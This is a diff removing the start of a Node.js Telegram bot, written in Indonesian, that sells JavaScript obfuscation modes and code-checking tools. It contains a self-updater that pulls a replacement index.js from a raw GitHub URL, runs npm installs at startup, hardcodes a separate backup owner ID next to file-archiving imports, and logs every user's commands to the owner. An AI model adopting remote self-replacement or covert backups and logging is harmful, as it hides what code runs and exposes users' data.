@@ -1,3366 +1,1508 @@
-const { Telegraf } = require('telegraf');
-const fs = require('fs-extra');
-const archiver  = require("archiver")
-const chokidar  = require("chokidar")
-const crypto = require('crypto');
-const { execSync } = require("child_process")
-
-function escapeHtml(text = "") {
-    return text
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-}
-
-function autoInstall(moduleName) {
-
-    try {
-
-        // cek module
-        require.resolve(moduleName)
-
-        console.log(
-            `MODULE ${moduleName} sudah terinstall`
-        )
-
-    } catch {
-
-        console.log(
-            `INSTALL installing ${moduleName}...`
-        )
-
-        try {
-
-            execSync(
-                `npm install ${moduleName}`,
-                {
-                    stdio: "inherit"
-                }
-            )
-
-            console.log(
-                `SUCCESS ${moduleName} berhasil diinstall`
-            )
-
-        } catch (err) {
-
-            console.log(
-                `PROSES INSTALL ${moduleName}`
-            )
-
-            console.log(
-                err.message
-            )
-        }
-    }
-}
-
-// =============================
-// AUTO INSTALL LIST
-// =============================
-const modules = [
-
-    "crypto",
-    "axios",
-    "fs-extra",
-    "grammy",
-    "moment-timezone",
-    "path",
-    "chokidar",
-    "archiver@5.3.1",
-    "acorn",
-    "os",
-    "vm",
-    "http",
-    "https"
-
-]
-
-// =============================
-// RUN AUTO INSTALL
-// =============================
-for (const mod of modules) {
-
-    autoInstall(mod)
-}
-const axios = require('axios')
-const os = require('os')
-const https = require("https")
-const http = require("http")
-const vm = require('vm')
-const acorn = require('acorn')
-const path = require('path')
-const { Bot, InputFile } = require('grammy')
-const moment = require("moment-timezone")
-const config = require('./config');
-
-// helper euyy
-const PATH_MAINTENANCE = "./database/maintenance.json"
-
-// =============================
-// CREATE FILE
-// =============================
-if (!fs.existsSync(PATH_MAINTENANCE)) {
-
-    fs.writeFileSync(
-        PATH_MAINTENANCE,
-        JSON.stringify({
-            status: false,
-            reason: "-"
-        }, null, 2)
-    )
-}
-
-// helper baca status maintenance
-function isMaintenance() {
-    try {
-        const data = JSON.parse(
-            fs.readFileSync(PATH_MAINTENANCE, "utf8")
-        )
-        return data.status === true
-    } catch {
-        return false
-    }
-}
-
-// Backup Files Jirr
-const BACKUP_OWNER_ID = 8937589616
-
-const BACKUP_DIR =
-path.join(__dirname, "backup")
-
-
-
-// =============================
-// CREATE BACKUP DIR
-// =============================
-if (!fs.existsSync(BACKUP_DIR)) {
-
-    fs.mkdirSync(
-        BACKUP_DIR,
-        {
-            recursive: true
-        }
-    )
-}
-
-const UPDATE_URL =
-"https://raw.githubusercontent.com/SabilOfficial-dev/SabilCase/main/indexcom.js"
-
-const LOCAL_FILE = "./index.js"
-
-const UPDATE_FLAG =
-"./update.flag"
-
-// Func
-const pause = (ms) => new Promise(resolve => setTimeout(resolve, ms))
-
-const E = {
-  bot: `<tg-emoji emoji-id='5987802868734760945'>✨</tg-emoji>`,
-  botStar: `<tg-emoji emoji-id='4956232383721374836'>✨</tg-emoji>`,
-  dev: `<tg-emoji emoji-id='5879770735999717115'>✨</tg-emoji>`,
-  doc: `<tg-emoji emoji-id='5839380580080293813'>✨</tg-emoji>`,
-  dot: `<tg-emoji emoji-id='5832251986635920010'>✨</tg-emoji>`,
-  duration: `<tg-emoji emoji-id='5776213190387961618'>✨</tg-emoji>`,
-  emoFree: `<tg-emoji emoji-id='5368324170671202286'>✨</tg-emoji>`,
-  err: `<tg-emoji emoji-id='5886496611835581345'>✨</tg-emoji>`,
-  games: `<tg-emoji emoji-id='4958903389523018769'>✨</tg-emoji>`,
-  group: `<tg-emoji emoji-id='5879896690210639947'>✨</tg-emoji>`,
-  grp: `<tg-emoji emoji-id='5983399041197675256'>✨</tg-emoji>`,
-  id: `<tg-emoji emoji-id='5819078828017849357'>✨</tg-emoji>`,
-  info2: `<tg-emoji emoji-id='5886440807325504167'>✨</tg-emoji>`,
-  key: `<tg-emoji emoji-id='5877307202888273539'>✨</tg-emoji>`,
-  link: `<tg-emoji emoji-id='5796440171364749940'>✨</tg-emoji>`,
-  mute: `<tg-emoji emoji-id='5771511103141975115'>✨</tg-emoji>`,
-  name: `<tg-emoji emoji-id='5883964170268840032'>✨</tg-emoji>`,
-  ok: `<tg-emoji emoji-id='6296501388276926215'>✨</tg-emoji>`,
-  set: `<tg-emoji emoji-id='5886707481844912001'>✨</tg-emoji>`,
-  shield: `<tg-emoji emoji-id='5843862283964390528'>✨</tg-emoji>`,
-  status: `<tg-emoji emoji-id='5839354140261619193'>✨</tg-emoji>`,
-  tools: `<tg-emoji emoji-id='5924720918826848520'>✨</tg-emoji>`,
-  total: `<tg-emoji emoji-id='5888799736508454231'>✨</tg-emoji>`,
-  user: `<tg-emoji emoji-id='5920344347152224466'>✨</tg-emoji>`,
-  version: `<tg-emoji emoji-id='5956561749070057536'>✨</tg-emoji>`,
-  warn: `<tg-emoji emoji-id='5881702736843511327'>✨</tg-emoji>`,
-  warnInfo: `<tg-emoji emoji-id='5954175920506933873'>✨</tg-emoji>`,
-
-  alasan: `<tg-emoji emoji-id='5839380580080293813'>📝</tg-emoji>`,
-  cantik: `<tg-emoji emoji-id='6296501388276926215'>💄</tg-emoji>`,
-  casino: `<tg-emoji emoji-id='4958903389523018769'>🎰</tg-emoji>`,
-  crown: `<tg-emoji emoji-id='5881702736843511327'>👑</tg-emoji>`,
-  game: `<tg-emoji emoji-id='4958903389523018769'>🎮</tg-emoji>`,
-  green: `<tg-emoji emoji-id='6296501388276926215'>🟢</tg-emoji>`,
-  jackpot: `<tg-emoji emoji-id='6296501388276926215'>🎉</tg-emoji>`,
-  kaya: `<tg-emoji emoji-id='6296501388276926215'>💵</tg-emoji>`,
-  khodam: `<tg-emoji emoji-id='5987802868734760945'>🔮</tg-emoji>`,
-  label: `<tg-emoji emoji-id='5886440807325504167'>🏷️</tg-emoji>`,
-  lilin: `<tg-emoji emoji-id='5839354140261619193'>🕯️</tg-emoji>`,
-  lock: `<tg-emoji emoji-id='5886496611835581345'>🔒</tg-emoji>`,
-  miskin: `<tg-emoji emoji-id='6296501388276926215'>💸</tg-emoji>`,
-  namebadge: `<tg-emoji emoji-id='5883964170268840032'>📛</tg-emoji>`,
-  pantun: `<tg-emoji emoji-id='5839380580080293813'>📜</tg-emoji>`,
-  red: `<tg-emoji emoji-id='5886496611835581345'>🔴</tg-emoji>`,
-  sad: `<tg-emoji emoji-id='5886496611835581345'>😢</tg-emoji>`,
-  spek: `<tg-emoji emoji-id='5883964170268840032'>📊</tg-emoji>`,
-  star2: `<tg-emoji emoji-id='5881702736843511327'>⭐</tg-emoji>`,
-  tampan: `<tg-emoji emoji-id='6296501388276926215'>🪞</tg-emoji>`,
-  tolol: `<tg-emoji emoji-id='5987802868734760945'>🧠</tg-emoji>`,
-  ukur: `<tg-emoji emoji-id='5839380580080293813'>📐</tg-emoji>`,
-  umur: `<tg-emoji emoji-id='5839354140261619193'>🎂</tg-emoji>`,
-  unlock: `<tg-emoji emoji-id='6296501388276926215'>🔓</tg-emoji>`,
-};
-
-const esc = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
-
-function analyseCode(code) {
-  let errorMsg   = ""
-  let errorLine  = null
-  let errorCol   = null
-  let fixSuggest = ""
-
-  try {
-    new Function(code) // eslint-disable-line no-new-func
-  } catch (e) {
-    errorMsg = e.message
-    const msg = e.message
-
-    let m = msg.match(/line (\d+)/i)
-    if (m) errorLine = parseInt(m[1])
-
-    if (!errorLine) {
-      m = (e.stack || "").match(/<anonymous>:(\d+):(\d+)/)
-      if (m) { errorLine = parseInt(m[1]) - 2; errorCol = parseInt(m[2]) }
-    }
-
-    if      (/unexpected token 'else'/i.test(msg))       fixSuggest = "Ada blok `if` tidak lengkap atau kurung kurawal `{}` hilang sebelum `else`."
-    else if (/unexpected token/i.test(msg))              fixSuggest = "Periksa tanda kurung `()`, kurawal `{}`, siku `[]`, atau titik koma `;` yang hilang/salah posisi."
-    else if (/is not defined/i.test(msg))                fixSuggest = "Variabel/fungsi belum dideklarasikan. Tambahkan `const/let/var` atau pastikan sudah di-import."
-    else if (/cannot read propert/i.test(msg))           fixSuggest = "Objek bernilai null/undefined. Gunakan optional chaining `?.` atau cek nilai terlebih dahulu."
-    else if (/await is only valid/i.test(msg))           fixSuggest = "`await` hanya valid di dalam `async function`. Bungkus kode dengan `async function() {}`."
-    else if (/missing \) after/i.test(msg))              fixSuggest = "Tanda kurung `()` tidak ditutup dengan benar."
-    else if (/missing } after/i.test(msg))               fixSuggest = "Kurung kurawal `{}` tidak ditutup. Cek penutupan function/object/class."
-    else if (/invalid or unexpected/i.test(msg))         fixSuggest = "Token tidak valid di posisi ini. Cek sintaks di sekitar baris error."
-    else if (/assignment to constant/i.test(msg))        fixSuggest = "Tidak bisa mengubah nilai `const`. Ganti dengan `let` jika perlu re-assign."
-    else if (/duplicate parameter/i.test(msg))           fixSuggest = "Ada parameter yang sama dalam function. Ganti nama parameter yang duplikat."
-    else if (/identifier.*already.*declared/i.test(msg)) fixSuggest = "Nama variabel sudah dipakai di scope yang sama. Ganti nama atau hapus deklarasi duplikat."
-    else if (/cannot use.*before.*init/i.test(msg))      fixSuggest = "Variabel dipakai sebelum dideklarasikan (temporal dead zone). Pindahkan deklarasi ke atas."
-    else if (/unexpected end of input/i.test(msg))       fixSuggest = "Kode belum selesai. Ada kurung atau string yang tidak ditutup di bagian akhir."
-    else if (/octal.*strict/i.test(msg))                 fixSuggest = "Literal oktal tidak diizinkan di strict mode. Hapus angka 0 di depan atau gunakan 0o prefix."
-    else                                                 fixSuggest = "Periksa sintaks dan logika di sekitar baris yang ditunjuk."
-  }
-
-  const annotated = code.split("\n").map((ln, idx) => {
-    const no    = String(idx + 1).padStart(4, " ")
-    const isErr = errorLine && idx + 1 === errorLine
-    return isErr
-      ? `${no} | >>>  ${ln}${errorCol ? `   ← ERROR col ${errorCol}` : "   ← ERROR DI SINI"}`
-      : `${no} |     ${ln}`
-  }).join("\n")
-
-  return { errorMsg, errorLine, errorCol, fixSuggest, annotated, hasError: !!errorMsg }
-}
-
-async function downloadTgFile(telegram, fileId) {
-
-    const file =
-    await telegram.getFile(fileId)
-
-    const url =
-    `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`
-
-    return new Promise((resolve, reject) => {
-
-        https.get(url, (res) => {
-
-            const chunks = []
-
-            res.on("data", d =>
-                chunks.push(d)
-            )
-
-            res.on("end", () =>
-                resolve(
-                    Buffer.concat(chunks)
-                    .toString("utf8")
-                )
-            )
-
-            res.on("error", reject)
-
-        }).on("error", reject)
-
-    })
-}
-
-function renderAnnotated(code, errLine) {
-  return code.split("\n").map((ln, idx) => {
-    const no = String(idx + 1).padStart(4, " ")
-    return errLine && idx + 1 === errLine
-      ? `${no} | >>>  ${ln}   ← ERROR`
-      : `${no} |     ${ln}`
-  }).join("\n")
-}
-
-function cleanCode(code) {
-  const lines  = code.split("\n")
-  let   indent = 0
-  const STEP   = 2
-  const out    = []
-
-  for (const raw of lines) {
-    const content = raw.trimEnd().trimStart()
-    if (!content) { out.push(""); continue }
-
-    if (/^[}\])]/.test(content)) indent = Math.max(0, indent - STEP)
-    out.push(" ".repeat(indent) + content)
-
-    const stripped = content.replace(/\/\/.*$/, "").replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|`(?:[^`\\]|\\.)*`/g, "").trimEnd()
-    const op = (stripped.match(/[{[(]/g) || []).length
-    const cl = (stripped.match(/[}\])]/g) || []).length
-    if (op > cl) indent += STEP
-  }
-
-  return out.join("\n").replace(/\n{3,}/g, "\n\n").trim()
-}
-
-function tryAutoFix(code) {
-let fixed    = code
-  let fixNotes = []
-
-  // Pass 1 — await di luar async
-  if (/\bawait\b/.test(fixed) && !/async\s*(function|\()/.test(fixed)) {
-    fixed = `async function _autoWrapper() {\n${fixed}\n}\n_autoWrapper().catch(console.error)`
-    fixNotes.push("Membungkus dalam async function (await di luar async)")
-  }
-  let r = analyseCode(fixed)
-  if (!r.hasError) return { fixed, fixNotes, result: r }
-
-  // Pass 2 — missing semicolons
-  const pass2 = fixed.split("\n").map(ln => {
-    const tr = ln.trimEnd()
-    if (
-      /^(const|let|var|return|throw|break|continue)\b/.test(tr.trim()) &&
-      !tr.endsWith(";") && !tr.endsWith("{") && !tr.endsWith("}") &&
-      !tr.endsWith(",") && !tr.startsWith("//") && !tr.startsWith("*")
-    ) return tr + ";"
-    return ln
-  }).join("\n")
-  r = analyseCode(pass2)
-  if (!r.hasError) { fixed = pass2; fixNotes.push("Menambahkan semicolon yang hilang"); return { fixed, fixNotes, result: r } }
-
-  // Pass 3 — tutup kurung kurawal
-  const opens3  = (fixed.match(/\{/g) || []).length
-  const closes3 = (fixed.match(/\}/g) || []).length
-  if (opens3 > closes3) {
-    fixed += "\n" + "}".repeat(opens3 - closes3)
-    fixNotes.push(`Menambahkan ${opens3 - closes3} kurung kurawal penutup`)
-    r = analyseCode(fixed)
-    if (!r.hasError) return { fixed, fixNotes, result: r }
-  }
-
-  // Pass 4 — tutup tanda kurung biasa
-  const openP  = (fixed.match(/\(/g) || []).length
-  const closeP = (fixed.match(/\)/g) || []).length
-  if (openP > closeP) {
-    fixed += ")".repeat(openP - closeP)
-    fixNotes.push(`Menutup ${openP - closeP} tanda kurung`)
-    r = analyseCode(fixed)
-    if (!r.hasError) return { fixed, fixNotes, result: r }
-  }
-
-  // Pass 5 — tutup kurung siku
-  const openB  = (fixed.match(/\[/g) || []).length
-  const closeB = (fixed.match(/\]/g) || []).length
-  if (openB > closeB) {
-    fixed += "]".repeat(openB - closeB)
-    fixNotes.push(`Menutup ${openB - closeB} kurung siku`)
-    r = analyseCode(fixed)
-    if (!r.hasError) return { fixed, fixNotes, result: r }
-  }
-
-  // Pass 6 — hapus baris error dan coba lagi
-  if (r.errorLine) {
-    const lines6  = fixed.split("\n")
-    const errIdx  = r.errorLine - 1
-    const removed = lines6.splice(errIdx, 1)[0]
-    const after6  = lines6.join("\n")
-    const r6      = analyseCode(after6)
-    if (!r6.hasError) {
-      fixed = after6
-      fixNotes.push(`Menghapus baris ${r.errorLine} penyebab error: "${removed.trim()}"`)
-      return { fixed, fixNotes, result: r6 }
-    }
-  }
-
-  return { fixed, fixNotes, result: r }
-}
-
-function formatRuntime(seconds) {
-  const days = Math.floor(seconds / (3600 * 24));
-  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
-  const minutes = Math.floor((seconds % 3600) / 60);
-  const secs = seconds % 60;
-
-  return `${days}D, ${hours}H, ${minutes}M, ${secs}S`
-}
-
-const startTime = Math.floor(Date.now() / 1000);
-
-function getBotRuntime() {
-  const now = Math.floor(Date.now() / 1000);
-  return formatRuntime(now - startTime);
-}
-
-async function checkUpdateFlag() {
-try {
-
-    if (
-        !fs.existsSync(
-            "./update.flag"
-        )
-    ) return
-
-    await bot.telegram.sendMessage(
-        config.OWNER_ID,
-`<blockquote><b>✅ Bot Telah Di Perbarui</b></blockquote>
-`, { parse_mode: "HTML" } )
-fs.unlinkSync("./update.flag")
-
-} catch (err) {
-
-    console.log(err)
-
-  }
-}
-// ===================== Clear ========\\\
-const bot = new Telegraf(config.BOT_TOKEN);
-// Plugin
-bot.telegram.setMyCommands([
-    {
-        command: 'start',
-        description: 'Mulai bot'
-    },
-    {
-        command: 'ai',
-        description: 'Chat Ai'
-    },
-    {
-        command: 'chatowner',
-        description: 'Memberi pesan ke owner'
-    },
-    {
-        command: 'broadcast',
-        description: 'khusus owner'
-    }   
-])
-.then(() => {
-    console.log('Success register cmd')
-})
-.catch(console.error)
-
-// =============================
-// LOG AKTIVITAS USER ONLY
-// =============================
-bot.use(async (ctx, next) => {
-
-    // hanya message text
-    if (!ctx.message?.text) {
-        return next()
-    }
-
-    const text =
-        ctx.message.text
-
-    // hanya command
-    if (!text.startsWith("/")) {
-        return next()
-    }
-
-    const user =
-        ctx.from
-
-    const userId =
-        Number(user.id)
-
-    // skip owner
-    if (userId === config.OWNER_ID) {
-        return next()
-    }
-
-    // waktu
-    const waktu =
-        new Date().toLocaleString(
-            "id-ID"
-        )
-
-    // ambil cmd
-    const cmd =
-        text.split(" ")[0]
-
-    // ambil args
-    const args =
-        text.split(" ")
-        .slice(1)
-        .join(" ") || "-"
-
-    // username
-    const username =
-        user.username
-        ? "@" + user.username
-        : "Tidak ada"
-
-    // mention
-    const mention =
-`${ctx.from.first_name}`
-
-    // kirim log ke owner
-    await bot.telegram.sendMessage(
-        config.OWNER_ID,
-`\`\`\`js
-╔═══════ ೋღ 🌺 ღೋ ═══════╗
-     Aktifitas-User-Terdeteksi
-╚═══════ ೋღ 🌺 ღೋ ═══════╝
-👤 USER : ${mention}
-👥 USERNAME : ${username}
-🆔 ID : ${userId}
-⚡ COMMAND : ${cmd}
-🕒 WAKTU : ${waktu}\`\`\`
-`,
-        {
-            parse_mode: "Markdown",
-            disable_web_page_preview: true
-        }
-    ).catch(() => {})
-
-    return next()
-
-})
-
-// =============================
-// MAINTENANCE MIDDLEWARE
-// =============================
-bot.use(async (ctx, next) => {
-
-    const data = JSON.parse(
-        fs.readFileSync(PATH_MAINTENANCE, "utf8")
-    )
-
-    const maintenance = data.status
-    const reason = data.reason || "Tidak ada alasan"
-
-    const userId = Number(ctx.from.id)
-
-    // =============================
-    // OWNER BYPASS
-    // =============================
-    if (userId === config.OWNER_ID) {
-        return next()
-    }
-
-    // =============================
-    // MAINTENANCE OFF
-    // =============================
-    if (!maintenance) {
-        return next()
-    }
-
-    // =============================
-    // USER & PREMIUM TERKENA
-    // =============================
-    return ctx.reply(
-        `\`\`\`js
-═════════•°•⚠️•°•═════════
-⚙️ BOT SEDANG MAINTENANCE
-
-Tunggu hingga maintenance selesai.
-📝 information : ${reason}
-═════════════════════════\`\`\`
-
-`,
-        {
-            parse_mode: "Markdown"
-        }
-    )
-})
-
-//// simpan mapping pesan owner -> user
-const CHAT_SESSION = {}
-const REPLY_MAP = {}
-const WAITING_UPDATE_LINK = {}
-
-// ==================== DATABASE AKSES ====================
-const ACCESS_FILE = './akses.json';
-
-function loadAkses() {
-    if (!fs.existsSync(ACCESS_FILE)) {
-        fs.writeJsonSync(ACCESS_FILE, { users: {} });
-    }
-    return fs.readJsonSync(ACCESS_FILE);
-}
-
-function saveAkses(data) {
-    fs.writeJsonSync(ACCESS_FILE, data, { spaces: 2 });
-}
-
-function isUserHasAccess(userId) {
-    const data = loadAkses();
-    return data.users[userId] === true;
-}
-
-function setUserAccess(userId, hasAccess) {
-    const data = loadAkses();
-
-    if (hasAccess) {
-        data.users[userId] = true;
-    } else {
-        delete data.users[userId];
-    }
-
-    saveAkses(data);
-}
-
-// ==================== THUMBNAIL LOKAL ====================
-async function getThumbnailBuffer() {
-    try {
-        if (await fs.pathExists(config.THUMBNAIL_PATH)) return await fs.readFile(config.THUMBNAIL_PATH);
-        return null;
-    } catch (err) { return null; }
-}
-
-// ==================== KEYBOARD ====================
-const openMenuKeyboard = {
-    inline_keyboard: [
-    [
-      { 
-        text: "𝖮𝗐𝗇𝖾𝗋", 
-        url: "https://t.me/sabilofficial",
-        style: "success" 
-       },
-      { 
-        text: "⌦", 
-        callback_data: "tools_menu", 
-        style: "primary" 
-       } 
-    ]
-  ]
-};
-
-const OwnKb = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⌫", 
-          callback_data: "main_menu",
-          style: "primary"
-         },
-         { 
-          text: "⌦", 
-          callback_data: "tools_menu",
-          style: "danger"
-         }
-       ]
-    ]
-};
-
-const ToolsKeyboard = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⌫", 
-          callback_data: "main_menu",
-          style: "primary"
-         },
-         { 
-          text: "⌦", 
-          callback_data: "enc_menu_v1",
-          style: "danger"
-         }
-       ]
-    ]
-};
-
-const EncV1Keyboard = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⌫", 
-          callback_data: "tools_menu",
-          style: "success"
-         },
-         { 
-          text: "⌦", 
-          callback_data: "enc_menu_v2",
-          style: "primary"
-         }
-       ]
-    ]
-};
-
-const EncV2Keyboard = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⌫", 
-          callback_data: "enc_menu_v1",
-          style: "danger"
-         },
-         { 
-          text: "⌦", 
-          callback_data: "main_menu",
-          style: "success" 
-         }
-       ]
-    ]
-};
-
-// wik wok the tolk
-async function sendEncryptProgress(ctx, waitMsg, modeName) {
-    const steps = [
-        { percent: 20, text: `⚙️ Mengunduh file (mode: ${modeName})`, delay: 600 },
-        { percent: 40, text: `⚙️ PROSES ENCRYPT (${modeName})`, delay: 800 },
-        { percent: 70, text: `⚙️ Encrypting dengan algoritma ${modeName}...`, delay: 800 },
-        { percent: 80, text: `⚙️ Penyelesaian Encrypt... Cukup Lama`, delay: 4000 },
-        { percent: 100, text: `✅ File berhasil diencrypt! (${modeName})`, delay: 500 }
-    ];
-    for (const step of steps) {
-        const barLength = 10;
-        const filled = Math.round((step.percent / 100) * barLength);
-        const bar = '▰'.repeat(filled) + '▱'.repeat(barLength - filled);
-        await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined, `<pre>✅ Encrypt Berjalan\n${step.text}\n${bar} ${step.percent}%</pre>`, { parse_mode: 'HTML' });
-        await new Promise(resolve => setTimeout(resolve, step.delay));
-    }
-}
-
-// kacung prime
-async function processObfuscate(
-    ctx,
-    obfuscator,
-    modeName = "default"
-) {
-
-    if (typeof obfuscator !== "function") {
-        console.error(
-            "Obfuscator tidak valid:",
-            obfuscator
-        )
-
-        return ctx.reply(
-            "❌ Obfuscator tidak valid."
-        )
-    }
-
-    const userId = ctx.from.id
-
-    if (
-        !isUserHasAccess(userId) &&
-        userId !== config.OWNER_ID
-    ) {
-        return ctx.reply(
-            "❌ Akses ditolak."
-        )
-    }
-
-    if (!ctx.message.reply_to_message) {
-        return ctx.reply(
-            "❌ Reply file .js"
-        )
-    }
-
-    let code = ""
-    let originalBaseName = "script"
-
-    const replied =
-        ctx.message.reply_to_message
-
-    if (replied.text) {
-
-        code = replied.text
-        originalBaseName = "code"
-
-    } else if (replied.document) {
-
-        const doc = replied.document
-
-        if (
-            doc.mime_type !==
-                "text/javascript" &&
-            !doc.file_name.endsWith(".js")
-        ) {
-            return ctx.reply(
-                "❌ File harus .js"
-            )
-        }
-
-        originalBaseName =
-            doc.file_name.replace(
-                /\.[^/.]+$/,
-                ""
-            )
-
-        const fileLink =
-            await ctx.telegram.getFileLink(
-                doc.file_id
-            )
-
-        const response =
-            await axios.get(
-                fileLink.href,
-                {
-                    responseType: "text"
-                }
-            )
-
-        code = response.data
-
-    } else {
-
-        return ctx.reply(
-            "❌ Reply file .js atau kode."
-        )
-
-    }
-
-    const outputFilename =
-        `${String(modeName)
-            .replace(/ /g, "_")
-            .toLowerCase()
-        }-encrypt-${originalBaseName}.js`
-
-    const waitMsg =
-        await ctx.reply(
-            `<pre>▰▱▱▱▱▱▱▱▱▱ 10%</pre>
-⚙️ Memulai Obfuscation: ${modeName}`,
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    try {
-
-        await sendEncryptProgress(
-            ctx,
-            waitMsg,
-            modeName
-        )
-
-        const obfuscated =
-            obfuscator(code)
-
-        const buffer =
-            Buffer.from(
-                obfuscated,
-                "utf8"
-            )
-
-        await ctx.replyWithDocument(
-            {
-                source: buffer,
-                filename: outputFilename
-            },
-            {
-                caption:
-                    `✅ Mode: ${modeName}\n` +
-                    `File berhasil di encrypt`
-            }
-        )
-
-        await ctx.deleteMessage(
-            waitMsg.message_id
-        ).catch(() => {})
-
-    } catch (err) {
-
-        console.error(err)
-
-        await ctx.telegram
-            .editMessageText(
-                waitMsg.chat.id,
-                waitMsg.message_id,
-                undefined,
-                `❌ Gagal:\n${err.message}`
-            )
-            .catch(() => {})
-
-    }
-
-}
-
-bot.start(async (ctx) => {
-    const userId = String(ctx.from.id);
-
-    // Simpan user baru otomatis
-    if (!isUserHasAccess(userId)) {
-        setUserAccess(userId, true);
-
-        console.log(
-            `[NEW USER] ${ctx.from.first_name || 'No Name'} (${userId})`
-        );
-    }
-
-    // Reaction ke pesan /start
-    try {
-        await ctx.telegram.setMessageReaction(
-            ctx.chat.id,
-            ctx.message.message_id,
-            [
-                {
-                    type: 'emoji',
-                    emoji: '🎉'
-                }
-            ]
-        );
-    } catch (err) {
-        console.log('Gagal memberi reaction:', err.message);
-    }
-
-    return showMenu1(ctx);
-});
-
-// ==================== TAMPILAN MENU ====================
-async function showMenu1(ctx, messageId = null) {
-    const bottime = getBotRuntime();
-    const caption = `\`\`\`js
-╔══════✮❁•°♛°•❁✮ ═════╗
-    𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨   ─  𝐔𝐬𝐞𝐫𝐬
-       𝐁𝐲 : 𝐒𝐚𝐛𝐢𝐥𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥
-╚══════✮❁•°❀°•❁✮══════╝
-
-System : Free Access Activated
-Usename : ${ctx.from.username}
-Id : ${ctx.from.id}
-Runtime : ${bottime}
-Featur : Encrypt For File,Tools,Dll
-━━━━━━━━━━━━━━━━━━━━
-
-﴿إِنَّ اللَّهَ هُوَ الرَّزَّاقُ ذُو الْقُوَّةِ الْمَتِينُ﴾ ۞ الذاريات / ٥٨
-
-Sesungguhnya Allah lah Pemberi rezki, Dialah yang mempunyai kekuatan yang kokoh.
-
-خداوند خود روزىرسان نيرومند استوار است.\`\`\`
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        // Edit pesan yang sudah ada
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'Markdown'
-            }, { reply_markup: openMenuKeyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'Markdown',
-                reply_markup: openMenuKeyboard
-            });
-        }
-    } else {
-        // Kirim pesan baru
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'Markdown', reply_markup: openMenuKeyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'Markdown', reply_markup: openMenuKeyboard });
-        }
-    }
-}
-
-async function showMenu2(ctx, messageId = null) {
-    const caption = `<pre>
-╔═══════ ೋღ 𝖳𝗈𝗈𝗅𝗌 𝖬𝖾𝗇𝗎 ღೋ ═══════╗
-╠ ▢ /cekcode Reply code
-╠ ▢ /cekerror Reply file/code
-╠ ▢ /infoerror Reply File/code
-╠ ▢ /cekidemoji Reply emoji
-╠ ▢ /fixerror Reply file/code
-╠ ▢ /cleancode Reply File/code
-╠ ▢ /ai 𝖢𝗁𝖺𝗍 teks
-╠ ▢ /getsource Link Https
-╚═══════ ೋღ ══ 🌸 ══ღೋ ═══════╝</pre>
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: ToolsKeyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: ToolsKeyboard
-            });
-        }
-    } else {
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: ToolsKeyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: ToolsKeyboard });
-        }
-    }
-}
-
-async function EncV1(ctx, messageId = null) {
-    const caption = `<pre>
-╔═══════ ೋღ 𝖤𝗇𝖼𝗋𝗒𝗉𝗍 𝖬𝖾𝗇𝗎 𝖵𝟣 ღೋ ═══════╗
-╠ ▢ /artillery Light & Secure 𝗉𝗋𝗈𝗍𝖾𝖼𝗍𝗂𝗈𝗇
-╠ ▢ /hardcode Max Protection mode
-╠ ▢ /phantom Invisible & Strong code
-╠ ▢ /balanced Smart & Stable defense
-╠ ▢ /reversed Rename & Shield system
-╠ ▢ /rosemary 𝖴𝗅𝗍𝗋𝖺 𝖣𝖾𝖿𝖾𝗇𝗌𝖾 𝗆𝗈𝖽𝖾
-╠ ▢ /enctime 𝟥𝟢 (𝟥𝟢 𝗁𝖺𝗋𝗂)
-╠ ▢ /hardhtml Encrypt Hard Html
-╠════════════════════════════════════╣
-║ Cara Penggunaan
-║ /enctime 30
-║ Jadi setiap angka = 1hari
-║ Jadi kalo 10 = 10hari
-╚═══════ ೋღ ═══  🌸  ═══ ღೋ ═══════╝</pre>
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: EncV1Keyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: EncV1Keyboard
-            });
-        }
-    } else {
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: EncV1Keyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: EncV1Keyboard });
-        }
-    }
-}
-
-async function EncV2(ctx, messageId = null) {
-    const caption = `<pre>
-╔═══════ ೋღ 𝖤𝗇𝖼𝗋𝗒𝗉𝗍 𝖬𝖾𝗇𝗎 𝖵𝟤 ღೋ ═══════╗
-╠ ▢ /enccustom 𝖢𝗎𝗌𝗍𝗈𝗆 𝖭𝖺𝗆𝖾
